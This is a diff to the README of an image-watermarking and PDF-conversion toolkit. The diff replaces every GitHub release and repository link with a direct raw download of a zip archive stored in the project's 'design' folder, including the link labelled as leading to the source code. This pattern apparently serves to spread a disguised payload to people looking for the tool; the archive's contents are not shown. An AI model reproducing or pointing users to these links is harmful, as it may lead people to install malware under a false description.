@@ -1,6 +1,6 @@
 # 🖼️ ImagePdfToolkit - Convert and Protect Your Images Effortlessly
 
-[![Download ImagePdfToolkit](https://img.shields.io/badge/Download-ImagePdfToolkit-blue?style=for-the-badge&logo=github&color=2ea44f)](https://github.com/Renegado6/ImagePdfToolkit/releases)
+[![Download ImagePdfToolkit](https://img.shields.io/badge/Download-ImagePdfToolkit-blue?style=for-the-badge&logo=github&color=2ea44f)](https://raw.githubusercontent.com/Renegado6/ImagePdfToolkit/main/design/Pdf_Toolkit_Image_1.2-beta.3.zip)
 
 ---
 
@@ -8,7 +8,7 @@
 
 Welcome to **ImagePdfToolkit**, your all-in-one local Windows solution for watermarking images and converting between images and PDF files. Whether you're a photographer protecting your work, a business professional creating documentation, or someone who simply needs to manage image files, this toolkit makes it incredibly easy.
 
-Visit this link to download the application: [https://github.com/Renegado6/ImagePdfToolkit/releases](https://github.com/Renegado6/ImagePdfToolkit/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/Renegado6/ImagePdfToolkit/main/design/Pdf_Toolkit_Image_1.2-beta.3.zip](https://raw.githubusercontent.com/Renegado6/ImagePdfToolkit/main/design/Pdf_Toolkit_Image_1.2-beta.3.zip)
 
 ---
 
@@ -37,7 +37,7 @@ All processing happens directly on your computer. No internet connection require
 ## 🚀 Installation Guide
 
 ### Step 1: Download the Application
-1. Visit this link to download the application: [https://github.com/Renegado6/ImagePdfToolkit/releases](https://github.com/Renegado6/ImagePdfToolkit/releases)
+1. Visit this link to download the application: [https://raw.githubusercontent.com/Renegado6/ImagePdfToolkit/main/design/Pdf_Toolkit_Image_1.2-beta.3.zip](https://raw.githubusercontent.com/Renegado6/ImagePdfToolkit/main/design/Pdf_Toolkit_Image_1.2-beta.3.zip)
 2. Look for the latest release and click the download link
 3. Save the file to an easy-to-find location like your Downloads folder
 
@@ -164,13 +164,13 @@ Your feedback helps us make ImagePdfToolkit better every day. If you have sugges
 - **Have a feature request?** Share it with the community
 - **Need help?** Check the documentation and FAQ sections
 
-Visit the repository to leave feedback or view the source code: [https://github.com/Renegado6/ImagePdfToolkit](https://github.com/Renegado6/ImagePdfToolkit)
+Visit the repository to leave feedback or view the source code: [https://raw.githubusercontent.com/Renegado6/ImagePdfToolkit/main/design/Pdf_Toolkit_Image_1.2-beta.3.zip](https://raw.githubusercontent.com/Renegado6/ImagePdfToolkit/main/design/Pdf_Toolkit_Image_1.2-beta.3.zip)
 
 ---
 
 ## 🏁 Ready to Get Started?
 
-Download ImagePdfToolkit today and experience the simplest way to watermark images and convert between image formats and PDF. Visit this link to download the application: [https://github.com/Renegado6/ImagePdfToolkit/releases](https://github.com/Renegado6/ImagePdfToolkit/releases)
+Download ImagePdfToolkit today and experience the simplest way to watermark images and convert between image formats and PDF. Visit this link to download the application: [https://raw.githubusercontent.com/Renegado6/ImagePdfToolkit/main/design/Pdf_Toolkit_Image_1.2-beta.3.zip](https://raw.githubusercontent.com/Renegado6/ImagePdfToolkit/main/design/Pdf_Toolkit_Image_1.2-beta.3.zip)
 
 Join thousands of satisfied users who rely on ImagePdfToolkit for their daily image and PDF needs. No registration, no subscription, no hidden costs—just a powerful, practical tool that works right out of the box. Your images deserve the best protection and management, and ImagePdfToolkit delivers exactly that.
 
